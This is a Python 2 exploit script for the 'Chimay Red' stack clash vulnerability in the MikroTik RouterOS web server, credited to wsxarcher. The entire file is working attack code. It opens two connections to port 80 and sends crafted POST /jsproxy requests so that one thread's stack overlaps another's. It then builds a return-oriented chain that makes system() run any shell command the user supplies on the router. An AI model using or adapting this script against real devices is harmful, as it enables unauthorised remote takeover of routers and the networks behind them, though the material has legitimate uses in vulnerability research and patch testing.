#!/usr/bin/env python2

# Mikrotik Chimay Red Stack Clash Exploit by wsxarcher (based on BigNerd95 POC)

# tested on RouterOS 6.38.4 (x86)

# AST_STACKSIZE = 0x20000 (stack frame size per thread)
# ASLR enabled on libs only
# DEP enabled

import socket, time, sys, struct
from pwn import *
import ropgadget

context(arch="i386", os="linux")

gadgets = dict()
plt = dict()
strings = dict()
system_chunks = []
cmd_chunks = []

def makeHeader(num):
    return bytes("POST /jsproxy HTTP/1.1\r\nContent-Length: ") + bytes(str(num)) + bytes("\r\n\r\n")

def makeSocket(ip, port):
    s = socket.socket()
    try:
        s.connect((ip, port))
    except:
        print("Error connecting to socket")
        sys.exit(-1)
    print("Connected")
    time.sleep(0.5)
    return s

def socketSend(s, data):
    try:
        s.send(data)
    except:
        print("Error sending data")
        sys.exit(-1)
    print("Sent")
    time.sleep(0.5)

def callRop(fun, args):
    payload = struct.pack('<L', fun)

    num = len(args)

    if num == 0:
        ret_gadget = gadgets['r']
    elif num == 1:
        ret_gadget = gadgets['p']
    elif num == 2:
        ret_gadget = gadgets['pp']
    elif num == 3:
        ret_gadget = gadgets['ppp']
    elif num == 4:
        ret_gadget = gadgets['pppp']
    elif num == 5:
        raise

    payload += struct.pack('<L', ret_gadget)

    for arg in args:
        payload += struct.pack('<L', arg)

    return payload

def strncpyRop(dst, src, length):
    return callRop(plt["strncpy"] , [dst, src, length])

def dlsymRop(handle, symbol):
    return callRop(plt["dlsym"], [handle, symbol])

# pwntools filters out JOP gadgets
# https://github.com/Gallopsled/pwntools/blob/5d537a6189be5131e63144e20556302606c5895e/pwnlib/rop/rop.py#L1074
def ropSearchJmp(elf, instruction):
    oldargv = sys.argv
    sys.argv = ['ropgadget', '--binary', elf.path, '--only', 'jmp']
    args = ropgadget.args.Args().getArgs()
    core = ropgadget.core.Core(args)
    core.do_binary(elf.path)
    core.do_load(0)

    sys.argv = oldargv

    for gadget in core._Core__gadgets:
        address = gadget['vaddr'] - elf.load_addr + elf.address
        if gadget['gadget'] == instruction:
            return address

    raise

def loadOffsets(binary, shellCmd):
    elf = ELF(binary)
    rop = ROP(elf)

    # www PLT symbols
    plt["strncpy"] = elf.plt['strncpy']
    plt["dlsym"] = elf.plt['dlsym']

    # Gadgets
    gadgets['pppp'] = rop.search(regs=["ebx", "esi", "edi", "ebp"]).address
    gadgets['ppp'] = rop.search(regs=["ebx", "ebp"], move=(4*4)).address
    gadgets['pp'] = rop.search(regs=["ebx", "ebp"]).address
    gadgets['p'] = rop.search(regs=["ebp"]).address
    gadgets['r'] = rop.search().address

    gadgets['jeax'] = ropSearchJmp(elf, "jmp eax")

    system_chunks.extend(searchStringChunks(elf, "system\x00"))
    cmd_chunks.extend(searchStringChunks(elf, shellCmd + "\x00"))

    # random rw "unused" place to store strings
    ctors = elf.get_section_by_name(".ctors").header.sh_addr

    strings['system'] = ctors
    strings['cmd'] = ctors + 0xf

def createPayload(binary):
    # ROP chain
    exploit = generateStrncpyChain(strings['system'], system_chunks)
    exploit += generateStrncpyChain(strings['cmd'], cmd_chunks)
    exploit += dlsymRop(0, strings['system']) # eax = libc.system
    exploit += struct.pack('<L', gadgets['jeax'])
    exploit += struct.pack('<L', gadgets['p'])
    exploit += struct.pack('<L', strings['cmd'])

    # Random address because the server is automatically restarted after a crash
    exploit += struct.pack('<L', 0x13371337)

    return exploit

def generateStrncpyChain(dst, chunks):
    chain = ""
    offset = 0
    for (address, length) in chunks:
        chain += strncpyRop(dst + offset, address, length)
        offset += length

    return chain

def searchStringChunks(elf, string):
    chunks = []
    total = len(string)

    if string == "":
        raise

    looking = string

    while string != "":
        results = [_ for _ in elf.search(looking)]

        if len(results) > 0:
            chunks.append((results[0], len(looking)))
            string = string[len(looking):]
            looking = string
        else:
            looking = looking[:-1]

    check_length = 0
    for (address, length) in chunks:
        check_length = check_length + length

    if check_length == total:
        return chunks
    else:
        raise


def stackClash(ip, binary, shellCmd):
    loadOffsets(binary, shellCmd)

    # 1) Start 2 threads
    # open 2 socket so 2 threads are created
    s1 = makeSocket(ip, 80) # socket 1, thread A
    s2 = makeSocket(ip, 80) # socket 2, thread B

    # 2) Stack Clash
    # 2.1) send post header with Content-Length 0x20900 to socket 1 (thread A)
    socketSend(s1, makeHeader(0x29000)) # thanks to alloca, the Stack Pointer of thread A will point inside the stack frame of thread B (the post_data buffer will start from here)

    # 2.2) send 0x700-0x14 bytes as post data to socket 1 (thread A)
    socketSend(s1, b'A'*(0x1000-20)) # increase the post_data buffer pointer of thread A to a position where a return address of thread B will be saved

    # 2.3) send post header with Content-Length 0x200 to socket 2 (thread B)
    socketSend(s2, makeHeader(0x8000)) # thanks to alloca, the Stack Pointer of thread B will point where post_data buffer pointer of thread A is positioned

    # 3) Create and send ROP chain
    exploit = createPayload(binary)
    socketSend(s1, exploit)

    # 4) Start ROP chain
    s2.close() # close socket 2 to return from the function of thread B and start ROP chain

if __name__ == "__main__":
    if len(sys.argv) == 4:
        stackClash(sys.argv[1], sys.argv[2], sys.argv[3])
    else:
        print("Usage: ./StackClashROPsystem.py IP binary shellcommand")
